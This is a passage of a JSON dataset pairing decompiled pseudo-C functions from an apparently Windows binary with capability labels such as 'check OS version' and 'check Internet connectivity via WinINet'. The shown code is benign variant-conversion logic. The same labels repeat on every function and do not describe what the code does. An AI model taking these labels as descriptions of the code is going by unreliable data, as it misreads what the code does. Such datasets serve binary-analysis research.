        "decompiled_code": "\nfloat10 fcn.00413830(void)\n\n{\n    ushort *in_EAX;\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    float var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    // switch table (21 cases) at 0x413852\n    switch(*in_EAX) {\n    case 0:\n        var_8h = 0.0;\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            puStack40 = 0x4138c6;\n            fcn.00410c3c();\n        }\n        var_8h = 0.0;\n        break;\n    case 2:\n        var_8h = in_EAX[4];\n        break;\n    case 3:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 4:\n        var_8h = *(in_EAX + 4);\n        break;\n    default:\n        uStack44 = 0x413995;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        fVar1 = fcn.004134b8();\n        var_8h = fVar1;\n        *in_FS_OFFSET = uStack48;\n        break;\n    case 0xb:\n        var_8h = in_EAX[4];\n        break;\n    case 0x10:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x11:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x12:\n        var_8h = in_EAX[4];\n        break;\n    case 0x13:\n        var_8h = *(in_EAX + 4);\n        break;\n    case 0x14:\n        var_8h = *(in_EAX + 4);\n    }\n    return var_8h;\n}\n",
        "token_count": 481
    },
    "00413c08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00413c08(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    double in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = SUB84(in_stack_ffffffe0, 0);\n    // switch table (21 cases) at 0x413c24\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x413c9c, uVar4);\n            fcn.00410c3c();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n    case 6:\n        in_stack_ffffffe0 = CONCAT44(0x413cc9, uVar4);\n        fcn.00413b0c();\n        break;\n    case 7:\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x413ceb, uVar4);\n        fcn.004139c0();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x413d94, uVar4);\n        fcn.00413b0c();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x413db4, uVar4);\n            fcn.004139c0();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x413dc4, uVar4);\n            fcn.00413b58();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x413f3e, uVar4);\n            cVar2 = fcn.00413bbc();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x413f49, SUB84(in_stack_ffffffe0, 0));\n                fcn.00413b0c();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x413dee\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x413f2f, uVar4);\n                fcn.00413b0c();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n            case 6:\n                in_stack_ffffffe0 = CONCAT44(0x413e65, uVar4);\n                fcn.00413b0c();\n                break;\n            case 7:\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x413e89, uVar4);\n                fcn.004139c0();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x413f22, uVar4);\n                fcn.00413c08();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00413aac(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = fVar3;\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x413d84, uVar4);\n        fcn.00413c08();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00413aac(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = fVar3;\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1022
    },
    "00414170": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 fcn.00414170(void)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint16_t *in_EAX;\n    float10 fVar3;\n    uint uVar4;\n    int64_t in_stack_ffffffe0;\n    \n    uVar1 = *in_EAX;\n    uVar4 = in_stack_ffffffe0;\n    // switch table (21 cases) at 0x41418c\n    switch(uVar1) {\n    case 0:\n        break;\n    case 1:\n        if (*0x4a1a54 != '\\0') {\n            in_stack_ffffffe0 = CONCAT44(0x414204, uVar4);\n            fcn.00410c3c();\n        }\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    case 5:\n        in_stack_ffffffe0 = CONCAT44(0x41423d, uVar4);\n        fcn.00414074();\n        break;\n    case 6:\n        break;\n    case 7:\n        in_stack_ffffffe0 = CONCAT44(0x41425f, uVar4);\n        fcn.00414074();\n        break;\n    case 8:\n        in_stack_ffffffe0 = CONCAT44(0x41426f, uVar4);\n        fcn.00413f58();\n        break;\n    case 9:\n    case 0xd:\n        in_stack_ffffffe0 = CONCAT44(0x414336, uVar4);\n        fcn.00414074();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            in_stack_ffffffe0 = CONCAT44(0x414356, uVar4);\n            fcn.00413f58();\n        }\n        else if (uVar1 == 0x101) {\n            in_stack_ffffffe0 = CONCAT44(0x414366, uVar4);\n            fcn.004140c0();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            in_stack_ffffffe0 = CONCAT44(0x41451d, uVar4);\n            cVar2 = fcn.00414124();\n            if (cVar2 == '\\0') {\n                in_stack_ffffffe0 = CONCAT44(0x414528, in_stack_ffffffe0);\n                fcn.00414074();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414390\n            switch(uVar1 & 0xbfff) {\n            default:\n                in_stack_ffffffe0 = CONCAT44(0x41450e, uVar4);\n                fcn.00414074();\n                break;\n            case 2:\n                break;\n            case 3:\n                break;\n            case 4:\n            case 5:\n                in_stack_ffffffe0 = CONCAT44(0x414413, uVar4);\n                fcn.00414074();\n                break;\n            case 6:\n                break;\n            case 7:\n                in_stack_ffffffe0 = CONCAT44(0x414437, uVar4);\n                fcn.00414074();\n                break;\n            case 8:\n                in_stack_ffffffe0 = CONCAT44(0x414447, uVar4);\n                fcn.00413f58();\n                break;\n            case 0xb:\n                break;\n            case 0xc:\n                in_stack_ffffffe0 = CONCAT44(0x414501, uVar4);\n                fcn.00414170();\n                break;\n            case 0x10:\n                break;\n            case 0x11:\n                break;\n            case 0x12:\n                break;\n            case 0x13:\n                break;\n            case 0x14:\n                fVar3 = fcn.00414014(SUB84(**(in_EAX + 4), 0), **(in_EAX + 4) >> 0x20);\n                in_stack_ffffffe0 = ROUND(fVar3);\n            }\n        }\n        break;\n    case 0xb:\n        break;\n    case 0xc:\n        in_stack_ffffffe0 = CONCAT44(0x414326, uVar4);\n        fcn.00414170();\n        break;\n    case 0x10:\n        break;\n    case 0x11:\n        break;\n    case 0x12:\n        break;\n    case 0x13:\n        break;\n    case 0x14:\n        fVar3 = fcn.00414014(SUB84(*(in_EAX + 4), 0), *(in_EAX + 4) >> 0x20);\n        in_stack_ffffffe0 = ROUND(fVar3);\n    }\n    return in_stack_ffffffe0;\n}\n",
        "token_count": 1055
    },
    "004147a0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004147a0(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint *puStack40;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    puStack40 = 0x4147c2;\n    var_4h = param_2;\n    var_5h = fcn.00415f5c();\n    if (var_5h != '\\0') {\n        puStack40 = &fcn.004147a0::pvarg;\n        puStack44 = 0x4147d4;\n        sub.oleaut32.dll_VariantInit();\n        uStack48 = 0x414815;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        puStack44 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))();\n        fcn.004054c0();\n        *in_FS_OFFSET = 0x100;\n        uStack48 = 0x41481c;\n        uStack52 = 0x414814;\n        uVar1 = fcn.00411420();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 335
    },
    "00414828": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414828(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    float10 fVar3;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    var_ch = 0xe;\n    do {\n        var_4h = 0;\n        var_ch = var_ch + -1;\n    } while (var_ch != 0);\n    var_1ch = 0x414d54;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00414828::var_20h;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414862\n    switch(uVar1) {\n    case 0:\n        var_18h = &stack0xfffffffc;\n        fcn.0040546c();\n        break;\n    case 1:\n        var_18h = &stack0xfffffffc;\n        if (*0x4a1a54 != '\\0') {\n            var_18h = &stack0xfffffffc;\n            fcn.00410c3c();\n        }\n        fcn.004054c0();\n        break;\n    case 2:\n        var_18h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.004054c0();\n        break;\n    case 3:\n        var_18h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.004054c0();\n        break;\n    case 4:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b5dc(var_2ch);\n        fcn.004054c0(var_2ch, var_28h, var_24h);\n        break;\n    case 5:\n        fVar3 = *(param_2 + 4);\n        var_2ch = SUB104(fVar3, 0);\n        var_28h = fVar3 >> 0x20;\n        var_24h._0_1_ = fVar3 >> 0x40;\n        var_18h = &stack0xfffffffc;\n        fcn.0040b5dc(var_2ch);\n        fcn.004054c0(var_2ch, var_28h, var_24h);\n        break;\n    case 6:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414538(var_28h, *(param_2 + 6));\n        fcn.004056f4();\n        break;\n    case 7:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00414570(var_28h, *(param_2 + 6));\n        fcn.004056f4();\n        break;\n    case 8:\n        var_18h = &stack0xfffffffc;\n        fcn.00405e78(&fcn.00414828::var_1ch);\n        var_28h = 0x4149bb;\n        fcn.004056f4();\n        break;\n    case 9:\n    case 0xd:\n        var_18h = &stack0xfffffffc;\n        fcn.00414670();\n        fcn.004054c0();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_18h = &stack0xfffffffc;\n            fcn.004054c0();\n        }\n        else if (uVar1 == 0x101) {\n            var_18h = &stack0xfffffffc;\n            fcn.0041473c();\n            fcn.004054c0();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_18h = &stack0xfffffffc;\n            fcn.0040546c();\n            cVar2 = fcn.004147a0();\n            if (cVar2 == '\\0') {\n                fcn.00414670();\n                fcn.004054c0();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x414aea\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_18h = &stack0xfffffffc;\n                fcn.00414670();\n                fcn.004054c0();\n                break;\n            case 2:\n                var_18h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.004054c0();\n                break;\n            case 3:\n                var_18h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.004054c0();\n                break;\n            case 4:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b5dc(var_2ch);\n                fcn.004054c0(var_2ch, var_28h, var_24h);\n                break;\n            case 5:\n                fVar3 = **(param_2 + 4);\n                var_2ch = SUB104(fVar3, 0);\n                var_28h = fVar3 >> 0x20;\n                var_24h._0_1_ = fVar3 >> 0x40;\n                var_18h = &stack0xfffffffc;\n                fcn.0040b5dc(var_2ch);\n                fcn.004054c0(var_2ch, var_28h, var_24h);\n                break;\n            case 6:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414538(var_28h, (*(param_2 + 4))[1]);\n                fcn.004056f4();\n                break;\n            case 7:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00414570(var_28h, (*(param_2 + 4))[1]);\n                fcn.004056f4();\n                break;\n            case 8:\n                var_18h = &stack0xfffffffc;\n                fcn.00405694();\n                break;\n            case 0xb:\n                var_18h = &stack0xfffffffc;\n                fcn.004145a8();\n                fcn.004056f4();\n                break;\n            case 0xc:\n                var_18h = &stack0xfffffffc;\n                fcn.00414828();\n                break;\n            case 0x10:\n                var_18h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.004054c0();\n                break;\n            case 0x11:\n                var_18h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.004054c0();\n                break;\n            case 0x12:\n                var_18h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.004054c0();\n                break;\n            case 0x13:\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409d58(var_28h);\n                fcn.004054c0(var_28h, 0);\n                break;\n            case 0x14:\n                var_24h._0_1_ = (*(param_2 + 4))[1];\n                var_28h = **(param_2 + 4);\n                var_18h = &stack0xfffffffc;\n                fcn.00409d58(var_28h);\n                fcn.004054c0(var_28h, var_24h);\n            }\n        }\n        break;\n    case 0xb:\n        var_18h = &stack0xfffffffc;\n        fcn.004145a8();\n        fcn.004056f4();\n        break;\n    case 0xc:\n        var_18h = &stack0xfffffffc;\n        fcn.00414828();\n        break;\n    case 0x10:\n        var_18h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.004054c0();\n        break;\n    case 0x11:\n        var_18h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.004054c0();\n        break;\n    case 0x12:\n        var_18h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.004054c0();\n        break;\n    case 0x13:\n        var_28h = *(param_2 + 4);\n        var_18h = &stack0xfffffffc;\n        fcn.00409d58(var_28h);\n        fcn.004054c0(var_28h, 0);\n        break;\n    case 0x14:\n        var_24h._0_1_ = *(param_2 + 6);\n        var_28h = *(param_2 + 4);\n        fcn.00409d58(var_28h);\n        fcn.004054c0(var_28h, var_24h);\n    }\n    *in_FS_OFFSET = var_28h;\n    var_20h = 0x414d5b;\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2584
    },
    "00414e80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414e80(uint param_1, uint *param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint pvarg;\n    uint var_14h;\n    int32_t *var_ch;\n    char var_5h;\n    uint *var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    if (param_2 != NULL) {\n        *param_2 = 0;\n    }\n    uStack48 = 0x414f38;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x414eb5;\n    var_4h = param_2;\n    var_5h = fcn.00415f5c();\n    if (var_5h != '\\0') {\n        puStack56 = &fcn.00414e80::pvarg;\n        puStack60 = 0x414ec7;\n        sub.oleaut32.dll_VariantInit();\n        uStack64 = 0x414f1b;\n        uStack68 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffbc;\n        puStack60 = &stack0xfffffffc;\n        (**(*var_ch + 0x1c))(8);\n        arg_8h = var_4h;\n        fcn.00405d8c();\n        fcn.00405e78(arg_8h);\n        *in_FS_OFFSET = arg_8h;\n        uStack68 = 0x414f22;\n        fcn.00411420();\n        return;\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x414f3f;\n    uStack48 = 0x414f37;\n    fcn.00405c48();\n    return;\n}\n",
        "token_count": 458
    },
    "00414f48": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00414f48(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    float10 fVar4;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uchar *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = &stack0xfffffffc;\n    iVar3 = 0xe;\n    do {\n        var_4h = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    var_18h = 0x41548d;\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00414f48::var_1ch;\n    uVar1 = *param_2;\n    // switch table (21 cases) at 0x414f81\n    switch(uVar1) {\n    case 0:\n        var_14h = &stack0xfffffffc;\n        fcn.00405c48();\n        break;\n    case 1:\n        var_14h = &stack0xfffffffc;\n        if (*0x4a1a54 != '\\0') {\n            var_14h = &stack0xfffffffc;\n            fcn.00410c3c();\n        }\n        fcn.00405dc8();\n        break;\n    case 2:\n        var_14h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.00405dc8();\n        break;\n    case 3:\n        var_14h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.00405dc8();\n        break;\n    case 4:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b5dc(var_28h);\n        fcn.00405dc8(var_28h, var_24h, var_20h);\n        break;\n    case 5:\n        fVar4 = *(param_2 + 4);\n        var_28h = SUB104(fVar4, 0);\n        var_24h = fVar4 >> 0x20;\n        var_20h._0_1_ = fVar4 >> 0x40;\n        var_14h = &stack0xfffffffc;\n        fcn.0040b5dc(var_28h);\n        fcn.00405dc8(var_28h, var_24h, var_20h);\n        break;\n    case 6:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414538(var_24h, *(param_2 + 6));\n        fcn.00405c84();\n        break;\n    case 7:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00414570(var_24h, *(param_2 + 6));\n        fcn.00405c84();\n        break;\n    case 8:\n        var_24h = 0x4150cd;\n        var_14h = &stack0xfffffffc;\n        fcn.00405e78(in_EAX);\n        break;\n    case 9:\n    case 0xd:\n        var_14h = &stack0xfffffffc;\n        fcn.00414d64();\n        fcn.00405c84();\n        break;\n    default:\n        if (uVar1 == 0x100) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405dc8();\n        }\n        else if (uVar1 == 0x101) {\n            var_14h = &stack0xfffffffc;\n            fcn.00414e1c();\n            fcn.00405c84();\n        }\n        else if ((uVar1 & 0x4000) == 0) {\n            var_14h = &stack0xfffffffc;\n            fcn.00405c48();\n            cVar2 = fcn.00414e80();\n            if (cVar2 == '\\0') {\n                fcn.00414d64();\n                fcn.00405c84();\n            }\n        }\n        else {\n    // switch table (21 cases) at 0x4151fc\n            switch(uVar1 & 0xbfff) {\n            default:\n                var_14h = &stack0xfffffffc;\n                fcn.00414d64();\n                fcn.00405c84();\n                break;\n            case 2:\n                var_14h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.00405dc8();\n                break;\n            case 3:\n                var_14h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.00405dc8();\n                break;\n            case 4:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b5dc(var_28h);\n                fcn.00405dc8(var_28h, var_24h, var_20h);\n                break;\n            case 5:\n                fVar4 = **(param_2 + 4);\n                var_28h = SUB104(fVar4, 0);\n                var_24h = fVar4 >> 0x20;\n                var_20h._0_1_ = fVar4 >> 0x40;\n                var_14h = &stack0xfffffffc;\n                fcn.0040b5dc(var_28h);\n                fcn.00405dc8(var_28h, var_24h, var_20h);\n                break;\n            case 6:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414538(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405c84();\n                break;\n            case 7:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00414570(var_24h, (*(param_2 + 4))[1]);\n                fcn.00405c84();\n                break;\n            case 8:\n                var_14h = &stack0xfffffffc;\n                fcn.00405d8c();\n                break;\n            case 0xb:\n                var_14h = &stack0xfffffffc;\n                fcn.004145a8();\n                fcn.00405c84();\n                break;\n            case 0xc:\n                var_14h = &stack0xfffffffc;\n                fcn.00414f48();\n                break;\n            case 0x10:\n                var_14h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.00405dc8();\n                break;\n            case 0x11:\n                var_14h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.00405dc8();\n                break;\n            case 0x12:\n                var_14h = &stack0xfffffffc;\n                fcn.00409c6c();\n                fcn.00405dc8();\n                break;\n            case 0x13:\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409d58(var_24h);\n                fcn.00405dc8(var_24h, 0);\n                break;\n            case 0x14:\n                var_20h._0_1_ = (*(param_2 + 4))[1];\n                var_24h = **(param_2 + 4);\n                var_14h = &stack0xfffffffc;\n                fcn.00409d58(var_24h);\n                fcn.00405dc8(var_24h, var_20h);\n            }\n        }\n        break;\n    case 0xb:\n        var_14h = &stack0xfffffffc;\n        fcn.004145a8();\n        fcn.00405c84();\n        break;\n    case 0xc:\n        var_14h = &stack0xfffffffc;\n        fcn.00414f48();\n        break;\n    case 0x10:\n        var_14h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.00405dc8();\n        break;\n    case 0x11:\n        var_14h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.00405dc8();\n        break;\n    case 0x12:\n        var_14h = &stack0xfffffffc;\n        fcn.00409c6c();\n        fcn.00405dc8();\n        break;\n    case 0x13:\n        var_24h = *(param_2 + 4);\n        var_14h = &stack0xfffffffc;\n        fcn.00409d58(var_24h);\n        fcn.00405dc8(var_24h, 0);\n        break;\n    case 0x14:\n        var_20h._0_1_ = *(param_2 + 6);\n        var_24h = *(param_2 + 4);\n        fcn.00409d58(var_24h);\n        fcn.00405dc8(var_24h, var_20h);\n    }\n    *in_FS_OFFSET = var_24h;\n    var_1ch = 0x415494;\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    fcn.00405c60();\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 2605
    },
    "004155e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004155e0(uint param_1, int16_t *param_2)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    \n    iVar1 = *param_2;\n    if (iVar1 == 0) {\n        fcn.00406f3c(param_1);\n    }\n    else if (iVar1 == 1) {\n        if (*0x4a1a54 != '\\0') {\n            fcn.00410c3c();\n        }\n        fcn.00406f3c(param_1);\n    }\n    else if (iVar1 == 9) {\n        fcn.00406f54();\n    }\n    else if (iVar1 == 0x4009) {\n        fcn.00406f54();\n    }\n    else {\n        cVar2 = fcn.00415f5c();\n        if (cVar2 != '\\0') {\n            fcn.00406f3c(param_1);\n            cVar2 = fcn.004046f4();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410c3c();\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "0041568c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041568c(char param_1, uint param_2)\n\n{\n    uint16_t *in_EAX;\n    \n    if ((*in_EAX & 0xbfe8) != 0) {\n        fcn.004113a4();\n    }\n    if (*0x4a1a5c == '\\0') {\n        *in_EAX = 3;\n    }\n    else {\n        *in_EAX = *(param_1 * 2 + 0x4a1a70);\n    }\n    *(in_EAX + 4) = param_2;\n    return;\n}\n",
        "token_count": 134
    },
    "00415cb8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
